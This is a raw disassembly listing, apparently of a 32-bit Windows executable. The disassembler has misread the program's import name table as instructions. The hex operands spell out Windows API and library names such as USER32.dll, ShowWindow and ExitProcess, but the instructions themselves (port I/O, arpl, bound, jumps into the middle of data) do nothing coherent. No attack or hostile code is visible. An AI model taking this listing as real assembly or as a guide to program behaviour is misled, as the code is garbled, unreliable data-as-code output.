  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
